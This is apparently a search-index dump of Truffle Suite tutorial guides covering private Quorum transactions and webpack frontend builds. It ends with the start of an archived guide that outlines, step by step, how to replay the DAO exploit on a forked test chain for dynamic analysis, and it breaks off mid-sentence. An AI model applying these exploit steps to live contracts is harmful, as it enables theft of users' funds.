developing for Quorum using Truffle is exactly like developing for the public Ethereum blockchain. Truffle supports Quorum out of the box, and the same strategies and methods for building Ethereum-enabled applications for the Ethereum public blockchain also apply to building dapps on Quorum.", "title": "Getting Started"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/#setting-up-your-quorum-client", "text": "The Quorum client is a replacement for the Ethereum client. Using the Quorum client, you can set up a private blockchain that's only available to you and the people you allow to participate. We're going to use a Quorum cluster of seven nodes (so seven Quorum clients) already set up and configured for us inside a virtual machine. You could choose to install Quorum yourself by downloading it directly and building it from source, but for this example, using the pre-configured cluster is much easier. To set up the cluster, open a terminal and navigate to a directory where you'd like it installed. Here, we chose workspace : mkdir workspace cd workspace Download the Quorum examples repository: git clone https://github.com/jpmorganchase/quorum-examples We'll use Vagrant to initialize the cluster's virtual machine. Note that this step could take a few minutes as it makes the virtual machine ready for use. cd quorum-examples vagrant up After vagrant up successfully completes, we'll want a way to access our newly minted virtual machine. Note that a virtual machine is like another computer running inside of your own, and so we'll need a way to access it in order to run commands within the machine. Luckily vagrant provides just such a feature. Type the following command: vagrant ssh Note that after running this command, our command line changes to show a different prompt: ubuntu@ubuntu-xenial:~$ This designates that we're running commands inside the virtual machine. While we're at the above virtual machine prompt, navigate to the example we want to run: ubuntu@ubuntu-xenial:~$ cd quorum-examples/7nodes/ Our Quorum client is nearly ready to go. We need to run two more commands within the virtual machine. The first one creates seven Quorum nodes we can use to simulate a real Quorum deployment. The second one starts up those seven nodes. While the first command only needs to be run one, you should run the second command anytime you restart the virtual machine. ubuntu@ubuntu-xenial:~/quorum-examples/7nodes$ ./raft-init.sh ubuntu@ubuntu-xenial:~/quorum-examples/7nodes$ ./raft-start.sh Success! We now have seven Quorum nodes set up that we can use to represent seven different actors on our private network.", "title": "Setting up your Quorum client"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/#connecting-truffle-to-quorum", "text": "To set up Truffle, we're going to start by creating a bare Truffle project, without any contracts or code. We want to leave the old command line window alone and let the Quorum example run without bothering it, so open a second terminal. In the new terminal, navigate to your workspace and create a new directory for your Truffle project. cd workspace mkdir myproject Next, navigate to the new directory and initialize the bare Truffle project: cd myproject truffle init If you look at the contents of the myproject directory, you'll notice directories were created for you. See the Truffle documentation for more information about Truffle's project structure. Before moving onto code, we need to configure Truffle to point to our running Quorum client. For this example, we'll edit our development network configuration within truffle-config.js to point to the first node available in the 7nodes example: // File: `truffle-config.js` (edited for 7nodes example) module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // was 8545 network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" , // needed for Truffle to support Quorum }, }, }; Note that we changed the port that Truffle normally connects to (we changed it to 22000 ). Because of the magic of VirtualBox and Vagrant, the node running inside the virtual machine is made available to us via local ports, so connecting via 127.0.0.1 and 22000 will work just fine. **Note**: The seven Quorum clients respond on ports `22000` (node 1) through `22006` (node 7). Now that we have Truffle set up, we can move onto code.", "title": "Connecting Truffle to Quorum"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/#deploying-smart-contracts-on-quorum", "text": "We won't spend too much time talking about writing or deploying contracts in Truffle since we have ample documentation , however we do want to show how deploying contracts applies to Quorum. First, copy the following contract into a new file, called SimpleStorage.sol . Place it in your contracts/ directory: // File: `./contracts/SimpleStorage.sol` pragma solidity ^ 0.4.17 ; contract SimpleStorage { uint public storedData ; constructor ( uint initVal ) public { storedData = initVal ; } function set ( uint x ) public { storedData = x ; } function get () view public returns ( uint retVal ) { return storedData ; } } Ensure the contract compiles using the command truffle compile within your project directory. truffle compile Next, create a new migration called 2_deploy_simplestorage.js within your migrations/ directory. Note that this migration is just like any other you'd create for Truffle, but there's one important difference. Let's see if you can catch it. // File: `./migrations/2_deploy_simplestorage.js` var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( deployer ) { // Pass 42 to the contract as the first constructor parameter deployer . deploy ( SimpleStorage , 42 , { privateFor : [ \"ROAZBWtSacxXQrOe3FGAqJDyJjFePR5ce4TSIzmJ0Bc=\" ], }); }; If you guessed the difference was privateFor , you got it! privateFor is an extra transaction parameter added to Quorum that specifies that the transaction you're making -- in this case a contract deployment -- is private for a specific account, identified by the given public key . For this transaction, the public key we chose represents node 7. Since we previously configured Truffle to connect to node 1, this transaction will deploy a contract from node 1, making the transaction private between node 1 and node 7. Now it's time to deploy your contracts. Run the truffle migrate command and watch your contracts be successfully deployed: truffle migrate You will see output that looks like this. Your transaction IDs will be different though. Using network 'development' . Running migration: 1_initial_migration.js Deploying Migrations... Migrations: 0x721650d027d87cd247a3a776c4b6170bf1e5b936 Saving successful migration to network... Saving artifacts... Running migration: 2_deploy_simplestorage.js Deploying SimpleStorage... SimpleStorage: 0x10ae69385c79ef3eb815ac008a7013d6878f1d38 Saving successful migration to network... Saving artifacts... Now that the contract's deployed, it's off to the races.", "title": "Deploying smart contracts on Quorum"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/#using-quorums-privacy-features-to-make-transactions-private", "text": "We originally configured Truffle to point our development environment to the first of the seven nodes provided by the example. You can think of the first node as \"us\", as if we were developing a dapp for a private network that's used by multiple other parties. Since the 7nodes example provides us seven nodes to work with, we can tell Truffle about the other nodes so we can \"be\" someone else, and ensure the contract we deployed was private. To add a new network configuration, edit your truffle-config.js file again and add additional network configuration, choosing a network name that best describes the network connection you're adding. In this case, we're going to add a connection to node 4 ( nodefour ) and node 7 ( nodeseven ): // File: `truffle-config.js` module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // was 8545 network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" , // needed for Truffle to support Quorum }, nodefour : { host : \"127.0.0.1\" , port : 22003 , network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" , // needed for Truffle to support Quorum }, nodeseven : { host : \"127.0.0.1\" , port : 22006 , network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" , // needed for Truffle to support Quorum }, }, }; Like before, VirtualBox and Vagrant are making these nodes available to us through local ports, so these configurations can look the same as our development configuration except with a different ports specified. Now that our configuration is set up, we can use the Truffle console to interact with our deployed contract. First let's be \"us\" (node 1), configured via our development configuration. The easiest way to do this is to launch the Truffle console , which lets us interact with our deployed contracts directly. truffle console You will see a new prompt: truffle ( development ) > Here, we'll get the deployed instance of the SimpleStorage contract and then get the integer value we specified on deployment. Enter the following command: truffle ( development ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); You'll see the following response: { [ String : '42' ] s : 1 , e : 1 , c : [ 42 ] } Note that Truffle's contract abstractions use Promises to interact with Ethereum. This can be a little cumbersome on the console as it requires a few extra key strokes to get things done, but within your application it makes control flow a lot smoother. Additionally, take a look at the output we received: We got 42 back, but as an object. This is because Ethereum can represent larger numbers than those natively represented by JavaScript, and so we need an abstraction in order to interact with them. Now let's try accessing the SimpleStorage contract as node four. To do this, quit out of the console (using Ctrl + C / Command + C ), and then launch the console again, but this time specifying the connection to node 4 instead of node 1: truffle console --network nodefour You'll see a new prompt: truffle ( nodefour ) > Run the same command as above to get the integer value from the SimpleStorage contract: truffle ( nodefour ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); You'll see the following response: { [ String : '0' ] s : 1 , e : 0 , c : [ 0 ] } You'll notice we got 0 back instead. This is because the accounts represented by node 4 weren't privy to this contract. Lastly we can try with node 7, which was privy to this contract. Quit and relaunch the console again: truffle console --network nodeseven You'll see a new prompt: truffle ( nodeseven ) > Run the same command as above to get the integer value from the SimpleStorage contract: truffle ( nodeseven ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); You'll see the following response: { [ String : '42' ] s : 1 , e : 1 , c : [ 42 ] } As you can see, we get 42 ! This shows that we can deploy contracts that are only available to our desired parties.", "title": "Using Quorum's privacy features to make transactions private"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/#interacting-with-contracts-privately", "text": "So far, we've shown you how to deploy contracts that are private within your migrations. When building a dapp on Quorum, it'd also be helpful to learn how to make all transactions private. Truffle uses its @truffle/contract contract abstraction wherever contracts are used in JavaScript. When you interacted with SimpleStorage in the console above, for instance, you were using a @truffle/contract contract abstraction. These abstractions are also used within your migrations, your JavaScript-based unit tests, as well as executing external scripts with Truffle. Truffle's contract abstraction allow you to make a transaction against any function available on the contract. It does so by evaluating the functions of the contract and making them available to JavaScript. To see these transactions in action, we're going to use an advanced feature of Truffle that lets us execute external scripts within our Truffle environment. Creating a file called sampletx.js and save it in the root of your project (the same directory as your truffle-config.js file). Then fill it with this code: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( done ) { console . log ( \"Getting deployed version of SimpleStorage...\" ); SimpleStorage . deployed () . then ( function ( instance ) { console . log ( \"Setting value to 65...\" ); return instance . set ( 65 , { privateFor : [ \"ROAZBWtSacxXQrOe3FGAqJDyJjFePR5ce4TSIzmJ0Bc=\" ], }); }) . then ( function ( result ) { console . log ( \"Transaction:\" , result . tx ); console . log ( \"Finished!\" ); done (); }) . catch ( function ( e ) { console . log ( e ); done (); }); }; This code does two things: First, it asks Truffle to get our contract abstraction for the SimpleStorage contract. Then, it finds the deployed contract and sets the value managed by SimpleStorage to 65 , using the contract's set() function. As with the migration we wrote previously, the privateFor parameter can be appended within an object at the end of the transaction to tell Quorum that this transaction is private between the sender and the account represented by the given public key. Run this code using truffle exec : truffle exec sampletx.js Your output should look something like this (your transaction ID will be different though): Using network 'development' . Getting deployed version of SimpleStorage... Setting value to 65 ... Transaction: 0x0a7a661e657f5a706b0c39b4f197038ef0c3e77abc9970a623327c6f48ca9aff Finished! We can now use the Truffle console, like before, to check the results of this transaction. Let's see the value as node one: truffle console truffle ( development ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); The response will be: { [ String : '65' ] s : 1 , e : 1 , c : [ 65 ] } We got 65 ! Now let's do node 4 (not privy to the transaction): truffle console --network nodefour truffle ( nodefour ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); The response will be: { [ String : '0' ] s : 1 , e : 0 , c : [ 0 ] } We got zero, as expected. Now let's try node 7: truffle console --network nodeseven truffle ( nodeseven ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); The response will be: { [ String : '65' ] s : 1 , e : 1 , c : [ 65 ] } And we got 65 again, as we should expect. This is how we can use Truffle's contract abstractions to make private transactions with Quorum.", "title": "Interacting with contracts privately"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/#is-that-all-truffle-can-do", "text": "Absolutely not! What we've shown you today is everything that makes building dapps for Quorum different than building dapps for the public Ethereum network. And what you'll see is it's not different at all: The only difference is adding the privateFor parameter for deployments and transactions you'd like to keep private. The rest is the same! In fact, now that you have the basics, you can explore all our other resources for building dapps with Truffle, including tutorial , writing advanced deployment scripts , unit testing ( with Solidity too ), and much more. By building with Truffle, you now have access to not only the best development tools and technologies (like Quorum), but you also have access to the largest Ethereum developer community around. Don't hesitate to drop us a line on Twitter or get help from fellow Trufflers in our community GitHub Discussions channel . There's always someone available to answer any questions you have. Cheers, and happy coding!", "title": "Is that all Truffle can do?"}, {"location": "guides/building-testing-frontend-app-truffle-3/", "text": "**Update**: While this tutorial was originally written for Truffle 3, we have updated it to be fully compatible with newer versions of Truffle. We have kept some of the language unaltered, except where necessary. Truffle 3 is out and switched to less opinionated build process that allows any build pipeline to be plugged in. We're going to take advantage of that feature today, and build a frontend app with a custom pipeline. Intended audience \u00b6 This is written for those familiar with Truffle and Ethereum, who want a sense of how to structure a frontend application for easy development and testing. This example uses webpack , but familiarity with other build tools is enough background. What does a build process need to do in Truffle? \u00b6 In general, simple: Turn all higher level code (like ES6, SASS, JSX, templates, etc.) into vanilla JavaScript/HTML/CSS artifacts, and then move those artifacts into the build/ folder alongside our contract artifacts. What this tutorial does \u00b6 Uses webpack to compile the application's frontend code and move the artifacts into the build/ folder. Getting started \u00b6 Once you have Truffle installed, run truffle unbox webpack in an empty directory to pull down the Truffle Box for this tutorial. If you're familiar with the MetaCoin Truffle Box ), you'll notice your old friends Metacoin.sol and ConvertLib.sol are there. But now, running truffle build does this: Error building: No build configuration specified. Can ' t build. Build failed. See above. That's ok! Truffle is getting out of your way and letting you control the build process. Our new process is specified in webpack.config.js . More on this later. Compile, migrate, and ... \u00b6 In order to interact with contracts, we need them deployed on a network! The default network is configured in truffle.js : networks : { development : { host : '127.0.0.1' , port : 7545 , network_id : '*' // Match any network id } } This is the default setting for Ganache , though you can change this to use any connection you'd like. **Note**: Read more about [setting up Ganache](/docs/ganache/quickstart). You can also use [Truffle Develop](/docs/truffle/getting-started/using-truffle-develop-and-the-console), which launches a personal blockchain for testing and is built directly into Truffle, no separate installation required. Let's get the contracts on the network: First run truffle compile . This will compile the .sol contracts into .json artifacts (specified in the @truffle/contract library). They will appear in build/contracts/*.json . Now we can include contracts in our app with a simple import or require statement: // Import our contract artifacts and turn them into usable abstractions. import metacoin_artifacts from '../../build/contracts/MetaCoin.json' Next, make sure you have a blockchain running, and then run truffle migrate . This will deploy the contracts onto the default network running at 127.0.0.1:7545 . ... (webpack) build \u00b6 All that's left is to use webpack to compile the app and place it in the build/ folder. A simple npm run dev and we're done! This will build the app and serve it on http://127.0.0.1:8080 . Relevant configs here: // file: package.json ... \"scripts\" : { \"lint\" : \"eslint ./\" , \"build\" : \"webpack\" , \"dev\" : \"webpack-dev-server\" }, ... // file: webpack.config.js ... entry : './app/javascripts/app.js' , output : { path : path . resolve ( __dirname , 'build' ), filename : 'app.js' }, plugins : [ // Copy our app's index.html to the build folder. new CopyWebpackPlugin ([ { from : './app/index.html' , to : 'index.html' } ]) ], ... You can find more information on webpack concepts on webpack's website . Notice we didn't have to use webpack here, but Truffle comes with a handy webpack demo that gets us started quickly. We could replace the webpack config with a Gruntfile , for instance, and use Grunt instead. Truffle don't care no mo'. The app \u00b6 As previously mentioned, the command npm run dev builds the app and serves it with a local web server. (This is equivalent to running npm run build and then truffle serve , but we've done it in one step for convenience.) To see it, navigate to http://127.0.0.1:8080 . You should see: That's it, all done! Happy Truffling! Extra: Webpack + Docker + Travis CI \u00b6 If you want to see how to deploy a frontend app using Docker and Travis build pipeline, check out my frontend example for added goodness.", "title": "Truffle Suite"}, {"location": "guides/building-testing-frontend-app-truffle-3/#intended-audience", "text": "This is written for those familiar with Truffle and Ethereum, who want a sense of how to structure a frontend application for easy development and testing. This example uses webpack , but familiarity with other build tools is enough background.", "title": "Intended audience"}, {"location": "guides/building-testing-frontend-app-truffle-3/#what-does-a-build-process-need-to-do-in-truffle", "text": "In general, simple: Turn all higher level code (like ES6, SASS, JSX, templates, etc.) into vanilla JavaScript/HTML/CSS artifacts, and then move those artifacts into the build/ folder alongside our contract artifacts.", "title": "What does a build process need to do in Truffle?"}, {"location": "guides/building-testing-frontend-app-truffle-3/#what-this-tutorial-does", "text": "Uses webpack to compile the application's frontend code and move the artifacts into the build/ folder.", "title": "What this tutorial does"}, {"location": "guides/building-testing-frontend-app-truffle-3/#getting-started", "text": "Once you have Truffle installed, run truffle unbox webpack in an empty directory to pull down the Truffle Box for this tutorial. If you're familiar with the MetaCoin Truffle Box ), you'll notice your old friends Metacoin.sol and ConvertLib.sol are there. But now, running truffle build does this: Error building: No build configuration specified. Can ' t build. Build failed. See above. That's ok! Truffle is getting out of your way and letting you control the build process. Our new process is specified in webpack.config.js . More on this later.", "title": "Getting started"}, {"location": "guides/building-testing-frontend-app-truffle-3/#compile-migrate-and", "text": "In order to interact with contracts, we need them deployed on a network! The default network is configured in truffle.js : networks : { development : { host : '127.0.0.1' , port : 7545 , network_id : '*' // Match any network id } } This is the default setting for Ganache , though you can change this to use any connection you'd like. **Note**: Read more about [setting up Ganache](/docs/ganache/quickstart). You can also use [Truffle Develop](/docs/truffle/getting-started/using-truffle-develop-and-the-console), which launches a personal blockchain for testing and is built directly into Truffle, no separate installation required. Let's get the contracts on the network: First run truffle compile . This will compile the .sol contracts into .json artifacts (specified in the @truffle/contract library). They will appear in build/contracts/*.json . Now we can include contracts in our app with a simple import or require statement: // Import our contract artifacts and turn them into usable abstractions. import metacoin_artifacts from '../../build/contracts/MetaCoin.json' Next, make sure you have a blockchain running, and then run truffle migrate . This will deploy the contracts onto the default network running at 127.0.0.1:7545 .", "title": "Compile, migrate, and ..."}, {"location": "guides/building-testing-frontend-app-truffle-3/#webpack-build", "text": "All that's left is to use webpack to compile the app and place it in the build/ folder. A simple npm run dev and we're done! This will build the app and serve it on http://127.0.0.1:8080 . Relevant configs here: // file: package.json ... \"scripts\" : { \"lint\" : \"eslint ./\" , \"build\" : \"webpack\" , \"dev\" : \"webpack-dev-server\" }, ... // file: webpack.config.js ... entry : './app/javascripts/app.js' , output : { path : path . resolve ( __dirname , 'build' ), filename : 'app.js' }, plugins : [ // Copy our app's index.html to the build folder. new CopyWebpackPlugin ([ { from : './app/index.html' , to : 'index.html' } ]) ], ... You can find more information on webpack concepts on webpack's website . Notice we didn't have to use webpack here, but Truffle comes with a handy webpack demo that gets us started quickly. We could replace the webpack config with a Gruntfile , for instance, and use Grunt instead. Truffle don't care no mo'.", "title": "... (webpack) build"}, {"location": "guides/building-testing-frontend-app-truffle-3/#the-app", "text": "As previously mentioned, the command npm run dev builds the app and serves it with a local web server. (This is equivalent to running npm run build and then truffle serve , but we've done it in one step for convenience.) To see it, navigate to http://127.0.0.1:8080 . You should see: That's it, all done! Happy Truffling!", "title": "The app"}, {"location": "guides/building-testing-frontend-app-truffle-3/#extra-webpack-docker-travis-ci", "text": "If you want to see how to deploy a frontend app using Docker and Travis build pipeline, check out my frontend example for added goodness.", "title": "Extra: Webpack + Docker + Travis CI"}, {"location": "guides/bundling-with-webpack/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Webpack is a powerful module bundler that helps turn your code into static assets you can deploy to the web. With the Truffle Solidity loader , we'll show you how you can use Webpack with your existing Truffle project. Intended Audience \u00b6 This tutorial is for Truffle users who are familiar with Webpack already. Since Webpack requires considerable knowledge to use effectively, we recommend checking out the Webpack documentation as well as the Truffle + Webpack Demo application before proceeding. Getting Started \u00b6 Navigate to your project in the command line, and then install the required dependencies. These dependencies are in addition to any other Webpack-related dependencies your project might have. $ npm install webpack webpack-dev-server truffle-solidity-loader --save-dev Set up Your Webpack Configuration \u00b6 You should already have a webpack configuration for your project. If you don't, an example configuration file is provided at the bottom of this tutorial. To enable Solidity support, add the truffle-solidity-loader as a plugin within your project: // your webpack configuration... module : { loaders : [ // ..., { test : /\\.sol/ , loader : 'truffle-solidity' } ] } Remove Default Build Configuration \u00b6 Since you're using Webpack to build your frontend, you won't want to use the default Truffle build process as the two processes will conflict. To ensure there are no issues if you or your teammates run truffle build , go ahead and delete the build configuration in your truffle.js file, if it exists. module . exports = { build : { // Delete this. // ... // and this. }, // and this too. rpc : { host : \"127.0.0.1\" , port : 8545 } } Bootstrapping Your Application \u00b6 Since you're bundling the frontend yourself and not using Truffle's default build process, certain \"magic\" provided by Truffle needs to be handled in order to get your application running properly. This includes: Detecting the web3 object provided to you by the user's Ethereum client, which as of this writing will likely be either Metamask or Mist . Provisioning your contract abstractions so they can communicate with your user's Ethereum client. Detecting Web3 \u00b6 In the past, Truffle bootstrapped applications to look for an open Ethereum node running at http://localhost:8545 , but this has proven to be insecure for the user as well as highly unlikely in a real world scenario. Instead, users are most likely to use Metamask or Mist to interact with web applications on the Ethereum network, and you should build your application to support that. Both Metamask and Mist inject a web3 object when the page is loading so you can hook into their transaction signing processes. Detecting this web3 object easy: var Web3 = require ( \"web3\" ); window . addEventListener ( 'load' , function () { // Supports Metamask and Mist, and other wallets that provide 'web3'. if ( typeof web3 !== 'undefined' ) { // Use the Mist/wallet provider. window . web3 = new Web3 ( web3 . currentProvider ); } else { // No web3 detected. Show an error to the user or use Infura: https://infura.io/ } }); Notice we only use the wallet's provider and not the whole web3 object provided to us. This ensures our application is not dependent on the wallet's version of Web3, and reduces the surface area in which version errors might occur. Provisioning Your Contract Abstractions \u00b6 Provisioning your contract abstractions requires two things: 1) that you include your contracts in your project, and 2) that you set up the Javascript abstractions so that they're correctly talking to the Ethereum client via Web3. When including contracts in your application, the Solidity Loader will resolve all .sol files to their associated contract abstraction, so importing your contracts is simply a matter of performing one of the following within your frontend: // ES5: var MyContract = require ( \"contracts/MyContract.sol\" ); // ES6: import MyContract from \"contracts/MyContract.sol\" ; After making sure your contract is imported, you now need to hook up the web3 object you detected above with the contract abstraction provided: MyContract . setProvider ( window . web3 . currentProvider ); Finally, you can use the contract abstraction as described within the Truffle documentation . You can prevent having to perform this provisioning more than once per contract dependency by either setting your contract abstractions to the global object, like window , and provisioning them once when your application loads; or using something like the ProvidePlugin to ensure your contract abstractions are available to every file within the bundle (recommended). Running Webpack \u00b6 From here you can run webpack like normal, via the normal webpack command or the webpack-dev-server , if you have those installed globally on your machine: $ webpack $ webpack-dev-server --hot Alternatively, you can edit your project's package.json file to run Wepback from the versions you installed at the beginning of this tutorial: \"scripts\" : { \"build\" : \"webpack\" , \"dev\" : \"webpack-dev-server --hot\" } Example Webpack Config \u00b6 Here's a very simple Webpack configuration file that uses the Truffle Solidity Loader as well as other plugins. This configration file exists within a React application where its source files exist within the ./app directory, and CSS is pulled out using the copy-webpack-plugin . Of course, your dapp's layout and structure will be different, but this should give you a good example of how the Solidity Loader fits within a simple application. var webpack = require ( \"webpack\" ); var CopyWebpackPlugin = require ( 'copy-webpack-plugin' ); var ExtractTextPlugin = require ( \"extract-text-webpack-plugin\" ); module . exports = { entry : './app/javascripts/app.jsx' , output : { path : \"./build\" , filename : 'app.js' }, module : { loaders : [ { test : /\\.(js|jsx|es6)$/ , exclude : /node_modules/ , loader : \"babel-loader\" }, { test : /\\.scss$/i , loader : ExtractTextPlugin . extract ([ \"css\" , \"sass\" ])}, { test : /\\.json$/i , loader : \"json-loader\" }, { test : /\\.sol/ , loader : 'truffle-solidity' } ] }, plugins : [ new CopyWebpackPlugin ([ { from : './app/index.html' , to : \"index.html\" }, { from : './app/images' , to : \"images\" }, { from : './app/fonts' , to : \"fonts\" } ]), new ExtractTextPlugin ( \"app.css\" ) ], devServer : { stats : 'errors-only' , } };", "title": "Truffle Suite"}, {"location": "guides/bundling-with-webpack/#intended-audience", "text": "This tutorial is for Truffle users who are familiar with Webpack already. Since Webpack requires considerable knowledge to use effectively, we recommend checking out the Webpack documentation as well as the Truffle + Webpack Demo application before proceeding.", "title": "Intended Audience"}, {"location": "guides/bundling-with-webpack/#getting-started", "text": "Navigate to your project in the command line, and then install the required dependencies. These dependencies are in addition to any other Webpack-related dependencies your project might have. $ npm install webpack webpack-dev-server truffle-solidity-loader --save-dev", "title": "Getting Started"}, {"location": "guides/bundling-with-webpack/#set-up-your-webpack-configuration", "text": "You should already have a webpack configuration for your project. If you don't, an example configuration file is provided at the bottom of this tutorial. To enable Solidity support, add the truffle-solidity-loader as a plugin within your project: // your webpack configuration... module : { loaders : [ // ..., { test : /\\.sol/ , loader : 'truffle-solidity' } ] }", "title": "Set up Your Webpack Configuration"}, {"location": "guides/bundling-with-webpack/#remove-default-build-configuration", "text": "Since you're using Webpack to build your frontend, you won't want to use the default Truffle build process as the two processes will conflict. To ensure there are no issues if you or your teammates run truffle build , go ahead and delete the build configuration in your truffle.js file, if it exists. module . exports = { build : { // Delete this. // ... // and this. }, // and this too. rpc : { host : \"127.0.0.1\" , port : 8545 } }", "title": "Remove Default Build Configuration"}, {"location": "guides/bundling-with-webpack/#bootstrapping-your-application", "text": "Since you're bundling the frontend yourself and not using Truffle's default build process, certain \"magic\" provided by Truffle needs to be handled in order to get your application running properly. This includes: Detecting the web3 object provided to you by the user's Ethereum client, which as of this writing will likely be either Metamask or Mist . Provisioning your contract abstractions so they can communicate with your user's Ethereum client.", "title": "Bootstrapping Your Application"}, {"location": "guides/bundling-with-webpack/#detecting-web3", "text": "In the past, Truffle bootstrapped applications to look for an open Ethereum node running at http://localhost:8545 , but this has proven to be insecure for the user as well as highly unlikely in a real world scenario. Instead, users are most likely to use Metamask or Mist to interact with web applications on the Ethereum network, and you should build your application to support that. Both Metamask and Mist inject a web3 object when the page is loading so you can hook into their transaction signing processes. Detecting this web3 object easy: var Web3 = require ( \"web3\" ); window . addEventListener ( 'load' , function () { // Supports Metamask and Mist, and other wallets that provide 'web3'. if ( typeof web3 !== 'undefined' ) { // Use the Mist/wallet provider. window . web3 = new Web3 ( web3 . currentProvider ); } else { // No web3 detected. Show an error to the user or use Infura: https://infura.io/ } }); Notice we only use the wallet's provider and not the whole web3 object provided to us. This ensures our application is not dependent on the wallet's version of Web3, and reduces the surface area in which version errors might occur.", "title": "Detecting Web3"}, {"location": "guides/bundling-with-webpack/#provisioning-your-contract-abstractions", "text": "Provisioning your contract abstractions requires two things: 1) that you include your contracts in your project, and 2) that you set up the Javascript abstractions so that they're correctly talking to the Ethereum client via Web3. When including contracts in your application, the Solidity Loader will resolve all .sol files to their associated contract abstraction, so importing your contracts is simply a matter of performing one of the following within your frontend: // ES5: var MyContract = require ( \"contracts/MyContract.sol\" ); // ES6: import MyContract from \"contracts/MyContract.sol\" ; After making sure your contract is imported, you now need to hook up the web3 object you detected above with the contract abstraction provided: MyContract . setProvider ( window . web3 . currentProvider ); Finally, you can use the contract abstraction as described within the Truffle documentation . You can prevent having to perform this provisioning more than once per contract dependency by either setting your contract abstractions to the global object, like window , and provisioning them once when your application loads; or using something like the ProvidePlugin to ensure your contract abstractions are available to every file within the bundle (recommended).", "title": "Provisioning Your Contract Abstractions"}, {"location": "guides/bundling-with-webpack/#running-webpack", "text": "From here you can run webpack like normal, via the normal webpack command or the webpack-dev-server , if you have those installed globally on your machine: $ webpack $ webpack-dev-server --hot Alternatively, you can edit your project's package.json file to run Wepback from the versions you installed at the beginning of this tutorial: \"scripts\" : { \"build\" : \"webpack\" , \"dev\" : \"webpack-dev-server --hot\" }", "title": "Running Webpack"}, {"location": "guides/bundling-with-webpack/#example-webpack-config", "text": "Here's a very simple Webpack configuration file that uses the Truffle Solidity Loader as well as other plugins. This configration file exists within a React application where its source files exist within the ./app directory, and CSS is pulled out using the copy-webpack-plugin . Of course, your dapp's layout and structure will be different, but this should give you a good example of how the Solidity Loader fits within a simple application. var webpack = require ( \"webpack\" ); var CopyWebpackPlugin = require ( 'copy-webpack-plugin' ); var ExtractTextPlugin = require ( \"extract-text-webpack-plugin\" ); module . exports = { entry : './app/javascripts/app.jsx' , output : { path : \"./build\" , filename : 'app.js' }, module : { loaders : [ { test : /\\.(js|jsx|es6)$/ , exclude : /node_modules/ , loader : \"babel-loader\" }, { test : /\\.scss$/i , loader : ExtractTextPlugin . extract ([ \"css\" , \"sass\" ])}, { test : /\\.json$/i , loader : \"json-loader\" }, { test : /\\.sol/ , loader : 'truffle-solidity' } ] }, plugins : [ new CopyWebpackPlugin ([ { from : './app/index.html' , to : \"index.html\" }, { from : './app/images' , to : \"images\" }, { from : './app/fonts' , to : \"fonts\" } ]), new ExtractTextPlugin ( \"app.css\" ) ], devServer : { stats : 'errors-only' , } };", "title": "Example Webpack Config"}, {"location": "guides/chain-forking-exploiting-the-dao/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Update : Since this tutorial was published, we have released Ganache , a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our Ganache Documentation Since The DAO was exploited , the Ethereum community has swarmed into action. From hardening our most popular language with the latest Solidity release to visualizing possible security vulnerabilities with SolGraph , the community has made security its number one focus. There are many ways in which to discover security threats, and most were discussed during Devcon 2 in Shanghai. The ethereumjs-testrpc authors have focused on one specifically, which we'll discuss here, called dynamic analysis through chain forking. What is Dynamic Analysis? \u00b6 Dynamic Analysis is the process of executing code and data in real-time with the hope of finding issues during execution. It's a similar process to exploratory testing , with the same goals, but perhaps more technical. Dynamic analysis on the Ethereum blockchain has historically been costly at worst and tedious at best. If you were to perform dynamic analysis on the live Ethereum chain, transactions would cost you hard-earned Ether, which might limit the tests you perform. Moving away from the live chain is possible, but it's a tedious process to move the live data over to a separate chain, and you'd have to perform this process multiple times if you end up mucking with the chain state during testing. Hello, TestRPC \u00b6 In early September, ethereumjs-testrpc released its --fork feature meant to solve the issues with dynamic analysis on the live chain (or any chain, for that matter). It did so by allowing you to \"fork\" from the live chain -- i.e., create a new blockchain that starts from the last block on the existing chain -- allowing you to make transactions on the new chain without spending real Ether or changing the existing chain's state. What's more, you can reset the chain back to its original state by simply restarting the TestRPC. This feature has big implications for many other areas of development, but today we'll talk about how we can use it for dynamic analysis. Exploiting The DAO \u00b6 One great feature of the TestRPC is that it's scriptable. Although this tutorial will show you how we exploited it, with the TestRPC's new --fork feature all you have to do is download the code and exploit it yourself, simply by running one command! You can find the full exploit code as a Truffle project here , and the original demo video below. Overview of the exploit \u00b6 The DAO exploit has many steps, and many of those steps are simply waiting for time to move forward. Here's a general overview of the steps we'll perform: Fork from the live chain at a block just before the DAO presale ended. We fork at this point in time to have as much Ether as we can to exploit (for example's sake). Participate in the presale by buying DAO tokens. Wait one day for the presale to end. Deploy our Hack contract to the network that we will eventually use to exploit the DAO. Transfer the DAO tokens we purchased to the hack contract. Have our DAO contract make a split proposal, which is required to perform the exploit. Vote yes on our own proposal (someone has to). Wait a week for our proposal voting time to end (we end up waiting eight days for good measure). Perform our split, which starts the hack. Then continue it in a loop! Aside: Traveling through time \u00b6 In the above overview, there are a few steps that require us to wait days to complete. Don't worry: the TestRPC has features that allow us to jump forward in time, so 